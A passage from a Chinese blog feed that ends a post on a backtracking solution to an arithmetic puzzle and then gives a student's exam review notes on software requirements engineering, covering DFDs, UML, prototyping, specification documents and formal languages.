class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本次实验在算法设计上只是剪枝函数的确定以及算法的优化上需要好好思考一下。<br>回溯法基本上就是深度优先搜索+剪枝函数。与枚举的思想类似，把所有能走的路都走一遍，直到找到符合要求的目标节点。这种算法的时间复杂度都很高，只能进行小规模的运算。就像此题，当数据规模为8时，就耗费了36秒。</p><p>在计算时间的时候，能找到解的情况与找不到解的情况下，时间可能会有较大的差异，使时间复杂度曲线不是很合理。因此我采用了每组数据都需要全部遍历完的方法，获取正确的时间复杂度。<br>其实本来想跑出k=9时的时间的，奈何实在是太慢了，得有好几分钟了，就只算到了k=8。这个经历，让我更加明白了，学好算法有多重要，暴力搜索效率实在太低了。</p><p>其实我在一开始设计好算法，写完程序后，参考了一下参考答案。我惊奇地发现我这个程序的逻辑上有两点问题。</p><ol><li><p>我在扩展子节点的时候，只考虑了4种情况（即+-*/）,忽略了反减和反除的情况。我仔细思考了一下为什么参考答案上要计算6种，而不是4种。后来发现进行-/位置的倒换，其实意味着这个题目允许加括号，而不只是限于普通的四则运算。</p><pre><code>可以以4 24 1 5 5 5该数据为例4种情况：没有解6种情况：有解   1/5=0.2;5-0.2=4.8;4.8*5=24;</code></pre><p>我又琢磨了一下书上的题目和给的样例，将算式写成最简形式。即(7*3*12-2)/2=125<br>这不是妥妥的可以加括号么！<br>于是，按照这个思想，我对原先的算法进行了修改。成功得出了正确的结果。</p></li><li><p>在输出上出现一些纰漏，没有考虑负数的情况，于是进行了修正，对负数加上括号。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> ACM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 回溯法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软件需求工程</title>
      <link href="/2020/learning/2019-2020s/%E8%BD%AF%E4%BB%B6%E9%9C%80%E6%B1%82%E5%B7%A5%E7%A8%8B/"/>
      <url>/2020/learning/2019-2020s/%E8%BD%AF%E4%BB%B6%E9%9C%80%E6%B1%82%E5%B7%A5%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>题型：单选题10个，填空题10个，判断题10，简答题4个，综合题1个  </p><!--more-->  <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h3 id="选择填空"><a href="#选择填空" class="headerlink" title="选择填空"></a>选择填空</h3><ol><li>软件需求规格说明书的内容不应包括对（算法的详细过程  ）的描述。  </li><li>需求分析最终结果是产生（ 需求规格说明书 ）  </li><li>需求分析中，开发人员要从用户那里解决的最重要的问题是（ 让软件做什么  ）  </li><li>需求规格说明书的作用不应包括（软件可行性研究的依据）  </li><li>软件需求分析阶段的工作，可以分成4个方面：需求获取，需求分析，编写需求规格说明书以及（ 需求评审 ）  </li><li>需求验证应该从下述几个方面进行验证：（一致性、现实性、完整性、有效性）  </li><li>需求分析阶段研究的对象是（用户需求）  </li><li>需求分析阶段建立原型的目的是 （ 确定系统是否满足用户需要  ）。  </li><li>需求分析的目的是保证需求的（ 完整性和一致性  ）。  </li><li>软件开发的需求活动，其主要任务是 （ 定义需求并建立系统模型 ）  </li><li>需求分析的步骤：调查研究、分析与综合、书写文档、需求分析评审  </li><li>需求分析阶段需编写的文档有需求规格说明书、初步用户使用手册、确认测试计划  </li><li>系统规格说明，数据要求，用户系统描述，修正的开发计划 ,这四份文档资料是在书写文档阶段必需完成的。  </li><li>软件需求的逻辑视图给出 ！软件要达到的功能和要处理数据之间的关系, 而不是实现的细节。  </li><li>优秀的需求规格说明应该具备 7个特性,即完整性、正确性、精确性、可行性、必要性、无歧义和可验证  </li><li>需求分析阶段研究的对象是软件项目的用户要求  </li><li>需求工程突出工程化的思想，强调以系统化、条理化和可重复化的方法与技术进行与软件需求相关的活动。               </li><li>需求是客户行为在问题域内希望看到的效果。  </li><li>非功能需求由性能需求与约束与限制构成。  </li><li>目标需求限定了项目的范围和项目应达到的目的。  </li><li>产品特性可以称为质量属性，在众多质量属性中，对于开发人员来说重要的属性有（可维护性、可移植性、可重用性、可测试性）  </li><li>软件开发中，原型是软件的一个早期可运行的版本，它反映最终系统的部分重要特性。其中探索性和实验性用完就可以丢弃，而进化型围绕原型修改和增加。  </li><li>常用的动态分析方法不包括（层次方框图），包括（状态迁移图、时序图、petri网）  </li></ol><h3 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h3><ol><li>需求工程包括需求获取和需求开发两个方面。x  </li><li>需求验证是需求工程中最后一个活动。x  </li><li>规格说明是问题域为满足用户需求而提供的解决方案,规定了解系统的行为特征。x  </li><li>业务需求具有明显的目的性和较高的抽象性,经过明确和细化的处理,可以直接转化为系统需求。x  </li><li>需求开发的一些特性决定了需求开发过程只能是一个简单的线性增量过程。x  </li><li>严格意义上的原型主要被用在需求分析阶段。√  </li><li>要完成相同的功能,构建抛弃式原型比构建演化式原型所花费的代价要大得多。x  </li><li>结构化分析方法适合于数据处理类型软件的需求分析。√  </li><li>软件需求描述的是“如何做”，而不是“做什么”。x  </li><li>软件需求的层次包括业务需求、用户需求、功能需求。√  </li></ol><h3 id="简答"><a href="#简答" class="headerlink" title="简答"></a>简答</h3><ol><li>简述需求工程的主要任务。<br> 需求工程有以下三个主要任务：  <ol><li>需求工程必须说明软件系统将被应用的环境及其目标，说明用来达成这些目标的软件功能，还要说明在设计和实现这些功能时上下文环境对软件完成任务所用方式、方法所施加的限制和约束，也即要同时说明软件需要“做什么”和“为什么”需要做。  </li><li>需求工程必须将目标、功能和约束反映到软件系统中，映射为可行的软件行为，并对软件行为进行准确的规格说明。需求规格说明是需求工程最为重要的成果，是项目规划、设计、测试、用户手册编写等很多后继软件开发阶段的工作基础。  </li><li>现实世界是不断变化的世界，因此需求工程还需要妥善处理目标、功能和约束随着时间的演化情况。同时，为了节省开支和进行需求规格说明的重用，需求工程还需要对目标、功能和约束在软件产品族中的演化和分布情况进行综合考虑与处理。  </li></ol></li><li>简述常见的需求定义错误。  <ol><li>需求并没有反映用户的真实需要。  </li><li>模糊和歧义的需求。   </li><li>信息遗漏。  </li><li>不必要的需求。   </li><li>不切实际的期望。  </li></ol></li><li>需求分析阶段需要执行哪些活动？  <ol><li>问题分析<br> 对问题进行分析，定义解决方案  </li><li>确定系统边界<br> 将所有问题的解决方案进行综合，就可以得到整个解系统的功能和边界  </li><li>需求建模<br> 对需求进行建模，完成从问题世界向计算机世界的转换  </li><li>需求细化<br> 明确用户需求的隐含信息，展开为明确的对软件系统的行为期望，即系统需求。  </li><li>确定需求优先级<br> 对需求进行分级，保证等级更高的需求得到更多的实现保证  </li><li>需求协商<br> 检测冲突的存在，并提供信息以帮助和引导协商活动的开展  </li></ol></li><li>需求规格说明书由哪些部分组成？各部分之间的关系是什么？<br> 软件需求说明书一般包括如下内容<br> 1）引言部分编写<br> 目的；项目背景（应包括：a.项目的委托单位、开发单位和主管部门；b．该软件系统与其他系统的关系。）；定义；列出文档中所用到的专门术语的定义和缩写词的原文。）<br> 2）任务概述<br> 目标；运行环境；条件与限制。<br> 3）数据描述<br> 静态数据；动态数据（包括输入数据和输出数据）；数据库描述（给出使用数据库的名称和类型）；数据词典；数据采集。<br> 4）功能要求<br> 功能划分；功能描述。<br> 5）性能需求<br> 数据精确度；时间特性（如响应时间、更新处理时间、数据转换与传输时间、运行时间等）；适应性（在操作方式、运行环境、与其他软件的接囗以及开发计划等发生变化时，应具有的适应能力。）<br> 5）运行需求<br> 用户界面（如屏幕格式、报表格式、菜单格式、输入输出时间等）；硬件接口；软件接口；故障处理。<br> 7）其他要求<br> 如可使用性、安全保密、可维护性、可移植性等。<br> 8）附录  </li></ol><h2 id="软件工程与需求工程"><a href="#软件工程与需求工程" class="headerlink" title="软件工程与需求工程"></a>软件工程与需求工程</h2><h3 id="选择填空-1"><a href="#选择填空-1" class="headerlink" title="选择填空"></a>选择填空</h3><ol><li>（数据流图）用于描述数据的处理过程。  </li><li>面向对象技术中，对象是类的实例。对象有三种成分（标识）、属性和方法（或操作）。  </li><li>在原型法中，开发人员根据（ 用户 ）的需求不断修改原型，直到满足客户要求为止。  </li><li>常用的需求分析方法有：面向数据流的结构化分析方法（SA），面向对象的分析方法（OOA），下列( 快速原型 )不是结构化分析方法的图形工具。  </li><li>下列软件开发模型中，（ 螺旋模型 ）只有在开发人员具有风险分析和排除风险的经验及专门知识时，才能获得成功。  </li><li>从瀑布模型看，在它的生命周期中的八个阶段中，下面的几个选项中哪个环节出错，对软件的影响最大（需求分析阶段）。  </li><li>传统的（ 瀑布模型 ）要求，必须等前一阶段的工作完成之后，才能开始后一阶段的工作；前一阶段的输出文档，就是后一阶段的输入文档。   </li><li>需求获取中常见的困难不包括下列哪个( 模型建立 )。  </li><li>建立需求基线的作用不包括（ 可以拓展应用 ）。  </li><li>软件开发的生命周期包括（ 需求分析 ）、软件设计、代码实现、（  测试  ）、（ 运行 ）、维护，共六个阶段。  </li><li>在软件开发中，使用原型时可采取两种不同的策略，即：（ 废弃）策略和（进化  ）策略。  </li><li>数据流图和数据字典共同构成了系统的逻辑模型，是需求规格说明书的主要组成部分。  </li><li>通常来说,如果用户需求出现了模糊、不清晰、不完整等具有一定不确定性的特征,就可以考虑使用原型法。  </li><li>模型语言的三要素：语法、语义、语用。其中语用给出了一个模型元素描述的更宽广的上下文,以及影响该模型元素意义的约束和假定。  </li><li>UML行为模型的活动图是依据处理流程进行的用例实现。  </li><li>UML行为模型的交互图通常描述的是单个用例的典型场景。  </li><li>需求基线的维护主要包括配置管理和状态维护  </li><li>风险管理的要素包括（风险评价、风险避免、风险控制）  </li></ol><h3 id="判断-1"><a href="#判断-1" class="headerlink" title="判断"></a>判断</h3><ol><li>需求验证并不是一个可以一次结束的活动,它可能需要多次、反复地执行验证。√  </li><li>数据流图中每个加工至少有一个输入数据流，但可以没有输出数据流。x  </li><li>业务规则包括企业方针、政府条例、工业标准、会计准则和计算方法等。业务规划本身就是软件需求。x  </li><li>需求工程包括需求获取和需求开发两个方面。x  </li><li>需求开发的一些特性决定了需求开发过程只能是一个简单的线性增量过程。x  </li><li>软件需求分析的关键是为真实世界的问题建立模型,即问题域建模。√  </li><li>软件成功的标准是用户在用，并且可以很容易做完要做的事。√  </li><li>获取需求活动的展开只要保证项目的范围，可以有需求遗漏。x  </li><li>在软件生命周期中，工程量最大的阶段就是编写程序。x  </li><li>开发人员和客户对软件质量因素的认可是完全一致的。x  </li></ol><h3 id="简答-1"><a href="#简答-1" class="headerlink" title="简答"></a>简答</h3><ol><li>如何有效的处理需求的变化是很多现代软件开发技术的主题，请从需求变更的原因，一般过程以及控制对策等方面谈谈你的看法。<br>①原因：需求变更时不可避免的。因为问题会发生变化，环境也会发生变化，原来的需求基线可能存在某些缺陷以及用户变动，用户对软件的认识变化，相关产品的出现都会产生需求变更的现象。<br> 需求基线就是被明确和固定的需求集合，是项目团队需要在某一特定产品版本中实现的特征和需求的集合。<br> ②一般过程：1.提出变更 2.变更评估 3.实施变更<br> ③控制对策：需求的变化需要控制。<br> 在响应需求变更的过程中，项目团队还要及时准确的维护需求基线，审计变更记录；<br> 要更新需求基线，保证项目涉众可以访问到最新的需求；   </li><li>简述软件开发中为何使用原型工具以及使用的好处。<br> 因为原型是在最终系统产生之前的一个局部真实表现,所以原型方法可以让人们在系统 的开发过程中,就能够对一些具体问题进行基于实物的有效沟通,从而帮助人们尽早解决软 件开发过程中存在的各种不确定性。不确定性是指人们已经拥有的知识是不充分的,不足以 预测将来的事件发展,或者不足以清晰、准确地描述某个事物。<br> 好处：<br> ①及时、有力地响应用户需求的变化。<br> ②减少返工。<br> ③帮助控制不完整需求所带来的风险。<br> ④可以将一个大的难以处理的开发过程细分成一些更小更容易处理的步骤。<br> ⑤减少开发成本,提高经济效益。<br> ⑥增加开发者之间的交流,帮助确定技术解决方案的可行性。<br> ⑦有效地识别风险和解决风险,帮助进行风险管理。<br> ⑧提高用户在软件开发中的参与程度。  </li></ol><h2 id="需求获取"><a href="#需求获取" class="headerlink" title="需求获取"></a>需求获取</h2><h3 id="选择填空-2"><a href="#选择填空-2" class="headerlink" title="选择填空"></a>选择填空</h3><ol><li>用例之间的关系主要有（包含、扩展和泛化）三种。  </li><li>项目前景与范围文档中，项目前景不应包括什么信息（  详细的功能需求    ）。  </li><li>下列不属于需求开发的活动的是( 需求管理)。  </li><li>需求获取的成果（获取笔录、录音或摄像）。  </li><li>采用观察方法进行需求获取的原因（事件的情景性）。  </li><li>需求跟踪是（需求管理）中的一个活动。  </li><li>需求开发计划的基本任务是确定需求开发的实施步骤，给出收集需求活动的具体安排和进度。  </li><li>需求获取得到的信息和需求开发应该建立的软件系统解决方案之间有着很大的差距。需求分析就是用来解决这个差距的需求工程活动。  </li><li>需求获取是从人、文档或者环境当中获取需求的过程，需求工程师必须要利用各种方法和技术来“发现”需求。  </li><li>确定项目目标与范围阶段的基本任务是把项目相关人员定位到一个共同的和明确的方向上，并决定软件系统的范围  </li><li>项目的目标主要包括软件开发的目的和意义，以及软件系统应实现的目标（即目标需求）。  </li><li>实地调查人员通常分为三步向掌握“全局”的负责人调查、向部门负责人调查以及向业务人员调查进行。  </li></ol><h3 id="判断-2"><a href="#判断-2" class="headerlink" title="判断"></a>判断</h3><ol><li>用例的内容只能包含有正常流程,而不能包含有异常流程。x  </li><li>发起或触发用例的外部用户以及其他软件系统等角色被称为参与者。√  </li><li>在需求不明确时，若找不到决策者，开发人员可以进行决定。x  </li><li>获取需求活动的展开只要保证项目范围，可以有需求遗漏。x  </li></ol><h3 id="简答-2"><a href="#简答-2" class="headerlink" title="简答"></a>简答</h3><ol><li>需求获取分为哪几个阶段？<br> 1、确定需求开发计划；<br> 2、确立项目的目标和范围；<br> 3、确定调查对象；<br> 4、实地收集需求信息；<br> 5、确定非功能需求。  </li><li>确定项目范围的好处是？<br> 1、可以判断用户所提出的需求信息是否对项目合适；<br> 2、有些用户需求信息可能是建议，这些建议是项目之外的，但可能有价值，因此可以改变项目范围适应这样的需求，但要考虑对进度、资金的影响。  </li><li>调研时通常会遇到怎样一些困难？<br> 1、能提出软件需求的用户可能觉得没有时间与开发人员进行交流和讨论；<br> 2、有时用户希望通过简单的方法与说明，或者通过简单的回答开发人员的询问后，软件开发人员就能清楚理解他们的需求，而不需要花费太多的时间进行讨论；<br> 3、用户和开发人员只考虑自己的利益；<br> 4、用户本身不能提出明确的需求；<br> 5、开发人员没有相关的业务知识。  </li><li>按照需求的层次，怎样进行用户分类？<br> 1、提出目标需求的用户；<br> 2、提出业务需求和功能需求的用户；<br> 3、软件开发人员，主要是指系统分析员。  </li></ol><h2 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h2><h3 id="选择填空-3"><a href="#选择填空-3" class="headerlink" title="选择填空"></a>选择填空</h3><ol><li>需求分析的目的是保证需求的（完整性和一致性  ）  </li><li>分析的活动主要包括识别、定义和结构化,它的目的是获取某个可以转换为知识的事物的信息,这种分析活动被称为建立需求分析模型  </li><li>（抽象和分解）是建模最为常用的两种手段。  </li><li>抽象通过强调本质的特征,（减少）了问题的复杂性。  </li><li>上下文图描述系统与环境中外部实体之间的界限和联系。它从现实世界的角度说明了系统的（边界和环境）,并确定了所有的输入和输出。  </li><li>UML使用的行为模型有三种,即：（交互图、状态图和活动图  ）。  </li><li>需求获取得到的信息和需求开发应该建立的软件系统解决方案之间有着很大的差距。需求分析就是用来解决这个差距的需求工程活动。  </li><li>需求分析的根本任务是：建立分析模型并创建解决方案。  </li><li>建立系统关联图主要是根据需求获取阶段确定的系统范围，用图形表示系统与外部实体间的关联。  </li><li>分析需求可行性的基本任务是在允许的成本和性能要求以及系统的范围内，分析每项需求得以实施的可能性。  </li><li>需求分析过程应该建立三种模型，他们分别是数据模型、功能模型、行为模型。以下几种图形中，数据流图（DFD）属于功能模型，实体-联系图（ERD）属于数据模型，状态转换图（STD）属于行为模型。  </li></ol><h3 id="简答-3"><a href="#简答-3" class="headerlink" title="简答"></a>简答</h3><ol><li>请说明为何要确定需求的优先级。<br>参考：在理想的情况下,开发者应该让最终的软件系统完美地满足用户提出来的所有需求。但是这种理想的情况并不总是会在现实中发生,甚至是很少在现实中发生。作为一项工程,软件开发总是在一定的环境限制下进行的,成本效益比是它成功的一个基本衡量标准。因此,在工程环境下,需求与需求之间并不是同等重要的,一些需求应该优于另一些需求得到更多在实践中,确定优先级的活动尤为重要的情况有：<br> ①一个项目的资源（时间、人力、成本等）有限,无法满足用户的所有需求。此时项目管理者就需要确定一种最佳方案,在既定的成本下取得最大的效益。需求优先级就是项目管理者进行此项工作的重要基础。<br> ②项目采用了分阶段的开发方式。为了最大化地体现项目的成本效益,项目应该在第一阶段就交付用户最重要和最紧急的需求,并将用户最不重要和最不紧急的需求放在开发的最后一个阶段。这就需要通过确定需求优先级的方式来划分需求的重要性和紧急性等级。<br> ③在项目的开始阶段,并不能明确所有的用户需求,或者无法保证会最终满足所有的用户需求。这个情况是实践中最为常见的情况,迭代式的开发基本都属于这种情况。对这种情况,要区分用户需求的优先级,优先迭代级别高的需求,保证项目最终最大程度地满足了用户的需求。<br> 我的答案：<br> 划分优先级可以①帮助项目相关人员判断系统的核心需求，并有助于项目相关人员集中于重点问题的交流和协商。<br> ②特别是涉及需求风险分析的时候。需求优先级之间的关联可以帮助软件开发人员决定软件体系结构，还可以帮助解决可能发生的设计冲突。<br> ③此外，软件开发人员可以根据需求的优先级权衡合理的项目范围和进度安排、预算、人力资源以及质量目标的要求。<br> ④在需求获取的理想情况下，开发人员应在客户表达需求时由客户决定需求的重要性，标上需求的优先级。然而，如果单独让客户来决定需求的优先级是很难做到的，在众多具有不同期望的用户之间达到一致意见就更难了。因为客户有时总是不能完全理解所提出需求的具体含义，并且每个人的背景、出发点和利益不同，导致他们之间并不总是能产生妥协。<br> ⑤因此，优先级的分配应当由软件开发人员和项目相关人员共同完成，最好是在做了一些初始的分析工作后，再进行需求优先级的分配。<br> ⑥在理想的情况下，开发者应该让最终的软件系统完美地满足用户提出来的所有需求。但是这种理想的情况并不总是会在现实中发生，甚至是很少在现实中发生。作为一项工程，软件开发总是在一定的环境限制下进行的，成本效益比是它成功的一个基本衡量标准。因此，在工程环境下，需求与需求之间并不是同等重要的，一些需求应该优于另一些需求得到更多的实现保证，这就是要确定需求优先级的原因。  </li><li>需求分析的具体工作包括：<br> 1.建立系统关联图<br> 2.分析需求的可行性<br> 3.构件用户接口原型<br> 4.确定需求的优先级<br> 5.需求建模<br> 6.建立数据词典  </li><li>需求分析<br>需求分析是利用建模与分析技术对获取笔录的内容进行明确、整理、汇总,建立一个综合考虑问题域特性和需求的系统模型,然后根据系统模型将用户需求转化为系统需求的需求工程活动。  </li><li>范围（scope）：<br>范围指出当前项目是要解决产品长远规划中的哪一部分,范围声明它为项目划定了需求的界线。  </li></ol><h2 id="结构化分析方法"><a href="#结构化分析方法" class="headerlink" title="结构化分析方法"></a>结构化分析方法</h2><h3 id="选择填空-4"><a href="#选择填空-4" class="headerlink" title="选择填空"></a>选择填空</h3><ol><li>数据建模技术能够弥补过程建模在（ 数据说明 ）方面的缺陷,它描述数据的定义、结构和关系等特性。  </li><li>（数据流图DFD）是结构化分析方法的核心技术,它表明系统的输入、处理、存储和输出,以及它们如何在一起协调工作。  </li><li>数据流图DFD的基本符号不包括下列哪种（数据字典），包括（加工、外部实体、数据流、数据存储文件）。  </li></ol><h3 id="简答-4"><a href="#简答-4" class="headerlink" title="简答"></a>简答</h3><ol><li>简述使用 DFD描述系统过程模型是必须遵守哪些规则。<br>使用DFD描述系统过程模型是必须遵守一些规则，这些规则可以保证过程模型的正确性。这些规则有：<br> ①过程是对数据的处理，必须有输入，也必须有输出，而且输入数据集和输出数据集应该存在差异。<br> 如果过程在没有输入的情况下产生了输出，称之为“奇迹”，即输出数据在没有任何可见来源的情况下就奇迹般产生了。<br> 如果过程接收了数据输入却没有产生输出，称之为“黑洞”。它浪费了输入的数据资源，却没有做出应有的贡献。<br> 过程是对数据的处理，这种处理是要产生附加价值的，即进行了数据的加工和变换，而不是简单的数据转移。<br> ②数据流是必须和过程产生关联的，它要么是过程的数据输入，要么是过程的数据输出。<br> ③DFD当中所有的对象都应该有一个可以唯一标识自己的名称。过程使用动词，外部实体、数据流和数据存储使用名词。<br> ④将所有软件的输人/输出数据流用一连串加工连接起来。一般可以从输人端逐步到输出端，也可以从输出端逐步到输人端，或者从中间向两端展开。<br> ⑤应集中精力找出数据流。如发现有一-组数据，且用户将其作为一个整体来处理时，则把这组数据作为一个输人流，否则应视为不同的数据流。<br> ⑥在找到数据流后，标识该数据流，然后分析该数据流的组成成分及来去方向，并将其与加工连接。在加工被标识后，再继续寻找其他的数据流。<br> ⑦当加工需要用到共享和暂存数据时，设置文件及其标识。<br> ⑧分析加工的内部，如果加工还比较抽象或其内部还有数据流，则需将该加工进一步分解，直至到达底层图。<br> ⑨为所有的数据流命名。<br> ⑩为所有加工命名编号。编号的方法如下:对于子图的图号，通常是父图中相应被分解加工的编号，加工编号=图号+小数点+局部顺序号。  </li><li>请说明 DFD层次结构的建立的主要步骤。<br>DFD层次结构的建立的主要步骤是：<br> ①创建上下文图。<br> ②发现并建立DFD片断。<br> ③根据DFD片断组合产生0层图。<br> ④对0层图的过程进行功能分解,产生N层图。  </li></ol><h2 id="面向对象分析方法"><a href="#面向对象分析方法" class="headerlink" title="面向对象分析方法"></a>面向对象分析方法</h2><h3 id="选择填空-5"><a href="#选择填空-5" class="headerlink" title="选择填空"></a>选择填空</h3><ol><li>ERD中属性是实体的特征,不是数据。属性会以一定的形式存在,这种存在才是数据,被称为属性的（  值 ）。  </li><li>面向对象技术中，对象是类的实例。对象有三种成分（标识）、属性和方法（或操作）。  </li><li>下列不属于UML 行为模型的是（ 流程图  ）。  </li><li>面向对象的分析方法中，主要建立如下三个模型：（对象模型、动态模型、功能模型）  </li><li>状态转换图属于（行为模型）。  </li><li>OMT方法的基本思想是将面向对象的分析过程视为一个（模型）的构建过程。  </li><li>状态是任何可以观察到的（系统行为模式）。  </li><li>序列图可用于表达（对象与对象）之间可能发生的所有事件。  </li><li>从用户处获得的需求主要有：问题域的范围、目标需求、功能需求、（性能需求）、环境约束与限制等。  </li></ol><h3 id="简答-5"><a href="#简答-5" class="headerlink" title="简答"></a>简答</h3><ol><li>什么是关系的基数或度？<br>关系的基数是衡量关系复杂性的指标之一,又被称为关系的约束。<br> 一个实体在关系中的基数定义了在关系中其他实体实例确定的情况下,该实体实例可能参与关系的数量。<br> 我的答案：<br> 基数表明数据对象在关系上的数量约束<br> 度数是指参与关系的实体数量，是度量关系复杂度的一个指标  </li><li>在UML中，表示动态结构的模型有哪些？<br>状态图、活动图、序列图、协作图和配置图等。     </li><li>类之间的关系有哪几种？<br> 1.类之间的泛化关系<br> 2.类之间的组成关系<br> 3.对象属性间的静态关系<br> 4.对象行为间的动态关系  </li></ol><h2 id="需求定义"><a href="#需求定义" class="headerlink" title="需求定义"></a>需求定义</h2><h3 id="选择填空-6"><a href="#选择填空-6" class="headerlink" title="选择填空"></a>选择填空</h3><ol><li>下列（律师）不是需求规格说明文档的读者？  </li><li>需求规格说明书的作用不应包括（软件可行性研究的依据）  </li><li>下列（互操作性）不属于需求规范说明的特性。  </li></ol><h3 id="判断-3"><a href="#判断-3" class="headerlink" title="判断"></a>判断</h3><ol><li>需求规格说明是系统设计与建模的依据。x  </li><li>无含糊性要求对所有的需求规格说明只能有一种明确和统一的解释。√  </li><li>IEEEStd830标准是我国制定的用于需求规格说明描述的标准。x  </li><li>外部接口需求是指与外部软件系统交互的数据格式与规范。x  </li><li>人们通常会把用户界面的设计写入需求规格说明文档中。x  </li></ol><h3 id="简答-6"><a href="#简答-6" class="headerlink" title="简答"></a>简答</h3><ol><li>试比较编写需求规格说明文档所使用的三种语言。  <pre><code>需求工程师在描述需求规格说明文档时使用的语言分为三类：   ①非形式化语言，即自然语言。   ②半形式化语言，比自然语言具有更丰富的语义和更严格的语法同时又没有严格到完全基于数学方法的语言，例如ERD、DFD、UML等图形语言。   ③形式化语言，基于数学的语言，例如VDM、Z语言等。   自然语言具有复杂的规则和多样化的表达方式，所以它的表达能力最为强大。而且自然语言属于普通人的语言，每个人都熟知其规则、表达方式和特点，所以非常利于用户的理解。但同时自然语言也具有松散、模糊、歧义、凌乱等不好的特性。这使得它无法被机器所理解，它所描述的信息内容也无法准确地映射为机器行为。   形式化语言是基于数学方法的语言，具有数学的表示法特性。使用形式化语言描述的信息内容是可以进行逻辑一致性推导和证明的，所以它能够保证信息的正确性。而且形式化的信息描述能够被机器所理解，它所描述的信息内容可以准确地映射为机器行为。但是形式化描述的信息要求读者具备谓词演算方面的知识，这对普通的用户而言显然要求过高，以至于大多数用户无法读懂以形式化方法描述的信息。形式化方法所能描述的内容也是有限的，具体的有限性因形式化方法的不同而各异。   半形式化语言是介于自然语言和形式化语言之间的描述语言。一方面，半形式化语言具有严格的语法，定义方式比自然语言更加严格，这使得它可以避免自然语言模糊、松散、歧义、凌乱等不好的特性。另一方面，半形式化语言具有丰富的语义，使用规则比形式化语言更复杂和多样，这使得它具有比形式化方法更强的表达能力。但是，丰富的语义使得半形式化语言的语法无法严格到可以等价于数学方法的程度，所以它描述的信息还需要进行额外的处理才能够被机器所理解或者准确地映射为机器行为。同时，严格的语法限制也使得半形式语言的表达能力无法达到自然语言的程度。而且因为具有独特的语法和语义，所以半形式语言对普通用户而言无异于一门全新的语言，它所描述的信息很难被用户所理解。   自然语言采用了以文本为主的描述方式；   形式化语言也是使用以文本为主的描述方式；   半形式化语言采用了以图形为主的描述方式，   因为：   ①半形式化语言的语法限制使得它用于信息描述的基本元素是有限的，这个有限性使得它以限定文本或者限定图形符号为描述方式成为可能。   ②半形式化语言追求表达语义的丰富性，而在这一点上图形符号是胜过限定文本的，所以人们倾向于选择使用图形符号的描述方式。   在进行需求规格说明文档的编写时，用户倾向于使用自然语言，因为其他两种类别的语言难以理解。开发人员倾向于使用半形式语言和形式化语言，因为自然语言的表达不够严格和准确。形式化语言在实践中的应用很少，因为需求规格说明对语言的语义和表达能力有着较高的要求，而这恰恰是形式化语言有所欠缺的。   为了让需求规格说明文档的内容能够同时满足用户和开发人员的需要，需求工程师在实践中更多时候会综合使用自然语言、半形式化语言和形式化语言。  </code></pre></li><li>请说明为什么要编写需求规格说明文档？<br> （1）编写需求规格说明文档的必要性：<br> 在一个复杂软件系统的开发中，编写需求规格说明文档是非常必要的。<br> 一方面，清晰、明确、结构化的文档可以将软件系统的需求信息和解决方案更好的传递给所有的开发者。另一方面，文档可以拓展人们的知识记忆能力。<br> （2）编写需求规格说明文档的他好处：<br> ①需求规格说明文档可以成为各方人员之间有关软件系统的协议基准。开发者和客户可以使用它作为合同协议的重要部分，涉众也可以利用它在相互间达成一致。<br> ②需求规格说明文档可以成为项目开发活动的一个重要依据。它可以作为软件估算和项目进度安排的基础，也可以作为开发人员判断设计、测试等工作的进行是否正确的依据。<br> ③在需求规格说明文档的编写过程中，可以尽早的发现和减少可能的需求错误，从而减少项目的返工，降低项目的工作量。<br> ④需求规格说明文档可以成为有效的智力资产。这个智力资产可以帮助新加入的团队成员更快的融入项目，可以帮助更好地将软件产品移交给新客户，也可以帮助开发者更好地进行其他类似项目或者后续增强项目的开发。  </li><li>编写需求规格说明文档时应该注意一些什么？<br> 1.保持语句和段落的简短，尽量避免将多个需求集中于一个冗长的语句和段落中；<br> 2.最好采用主谓宾的表达方式，并使用正确的语法和标点符号；<br> 3.使用的术语应与词汇表中所定义的一致；<br> 4.为了减少不确定性，必须避免模糊的、主观的术语；<br> 5.避免使用比较性的词汇，应定量地说明所需要提高的程度或者说清一些参数可接受的最大值和最小值；<br> 6.在编写中最好不要出现对某个或某些需求的重复说明；<br> 7.可以把顶层不明确的需求向低层详细分解，直到消除不明确性为止。   </li><li>需求规格说明<br>需求规格说明就是将需求及其软件解决方案进行定义和文档化，并传递给开发人员的需求工程活动。  </li><li>形式化需求描述语言<br>形式语言是基于数学方法而提出的一种抽象描述语言，该语言具有严格的语法和语义，通常把描述需求的形式语言称为形式化需求描述语言。  </li></ol><h2 id="形式化描述语言"><a href="#形式化描述语言" class="headerlink" title="形式化描述语言"></a>形式化描述语言</h2><h3 id="选择填空-7"><a href="#选择填空-7" class="headerlink" title="选择填空"></a>选择填空</h3><ol><li>描述需求所使用的表示法要符合正规性要求,一般可使用自然语言、结构化语言和形式化语言。在实践中，（自然语言）是主要的描述方式。  </li><li>在基于代数的形式化规格说明中，把数据与操作封装为一体的对象称为（抽象数据类型）。  </li><li>Z的表示符号主要为数学符号与（图表）符号。  </li><li>研究B方法，主要是因为Z语言在（模块化）方面的处理能力不足。  </li><li>基于模型的需求形式化描述方法是基于（集合论及一阶谓词）等数学理论的。  </li><li>在Z所描述的系统中，系统的状态由一些抽象的（变量）所刻画。  </li><li>在LOTOS的模型中，一个系统被看作是一些相互通信的（进程）的集合。  